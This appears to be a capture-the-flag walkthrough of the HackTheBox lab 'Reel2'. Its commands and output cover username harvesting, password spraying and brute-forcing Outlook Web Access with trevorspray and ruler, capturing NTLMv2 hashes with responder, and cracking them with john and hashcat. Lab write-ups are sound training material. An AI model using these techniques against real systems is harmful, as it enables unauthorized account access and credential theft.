### Build raw user list
##### written by AI
```javascript
http://10.129.220.109:8080/search?q=

const userFollowBoxes = document.querySelectorAll("table.user_follow_box");

const res = Array.from(userFollowBoxes)
  .filter(userblock => userblock.textContent.includes('@')) // Filter out userblocks without '@'
  .map(userblock => {
    const content = userblock.textContent.replace('@', '').trim();
    const endIndex = content.indexOf('\n');
    return endIndex !== -1 ? content.substring(0, endIndex) : content;
  });

console.log(res.join('\n'));
```

### Build proper userlist

```bash
git clone git@github.com:A1vinSmith/username-anarchy.git

./username-anarchy/username-anarchy --input-file raw_users --select-format f.last >> userlist
./username-anarchy/username-anarchy --input-file raw_users --select-format first.last >> userlist
./username-anarchy/username-anarchy --input-file raw_users --select-format l.first >> userlist

```

### OWA password spray
The first Reel was about Phishing, and there’s already OWA here, so that seems like a likely path.
```bash
feroxbuster -u http://10.129.220.109 --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt

403      GET       29l       92w     1233c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        0l        0w        0c http://10.129.220.109/owa => http://10.129.220.109/owa/
```

```bash
trevorspray -m owa -u userlist -p Summer2020  --url https://10.129.220.109/owa
[INFO] Command: /home/kali/.local/bin/trevorspray -m owa -u userlist -p Summer2020 --url https://10.129.220.109/owa
[INFO] Spraying 78 users * 1 passwords against https://10.129.220.109/owa at Tue May  9 12:40:31 2023
[WARN] NOTE: OWA typically uses the INTERNAL username format! Often this is different than the email format.
[WARN] This means your --usernames file should probably contain INTERNAL usernames
[WARN] Depending on the OWA instance, the usernames may also need the domain like so: "CORP.LOCAL\USERNAME"
[WARN] You can discover the OWA's internal domain with --recon
[WARN] If this isn't what you want, consider spraying with the "msol" or "adfs" module instead.
[INFO] Using OWA URL: https://10.129.220.109/owa
[SUCC] Found internal domain via NTLM: "htb.local"
[SUCC] 
{
    "NetBIOS_Domain_Name": "HTB",
    "NetBIOS_Computer_Name": "REEL2",
    "DNS_Domain_name": "htb.local",
    "FQDN": "Reel2.htb.local",
    "DNS_Tree_Name": "htb.local"
}
```

Add the domain as prefix to user list and spray again
```bash
# written by AI
#!/bin/bash

# Read the username list text file and add "htb.local\" prefix to each line
while IFS= read -r username; do
	username=$(echo "${username}" | tr -d '\n\r\t ')  # Remove new lines, carriage returns, tabs, and spaces
	if [[ -n "${username}" ]]; then
	    modified_username="HTB.local\\${username}"
	    printf "%s\n" "${modified_username}" >> domain-userlist
	fi
done < userlist
```

```bash
trevorspray -m owa -u domain-userlist -p Summer2020 --url https://10.129.220.109/owa
```

Above should work but it doesn't.

Ruler worked after couple times attempt
```bash
/opt/ruler-linux64 --domain reel2.htb.local -k brute --users userlist --passwords passwords.txt --delay 0 --verbose
[+] Starting bruteforce
[+] Trying to Autodiscover domain
[+] 0 of 2 passwords checked
[x] Failed: g.quimbly:Summer2020
ERROR: 16:43:55 brute.go:193: An error occured in connection - Get "https://reel2.htb.local/autodiscover/autodiscover.xml": Get "https://reel2.htb.local/autodiscover/autodiscover.xml": net/http: request canceled
[x] Failed: j.moore:Summer2020
[x] Failed: t.trump:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: 
```

* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying#outlook-web-access
* https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/
* https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/
* https://github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials
* https://github.com/dafthack/DomainPasswordSpray
* https://github.com/dafthack/MailSniper

### OWA logged in
`htb.local\s.svensson:Summer2020`
Set up responder to phish


```bash
sudo responder -I tun0

john svensson-hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
kittycat1        (k.svensson)     
1g 0:00:00:00 DONE 2/3 (2023-05-09 17:15) 16.66g/s 561516p/s 561516c/s 561516C/s maryjane1..pepper1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

hashcat -m 5600 svensson-hash /usr/share/wordlists/rockyou.txt
```
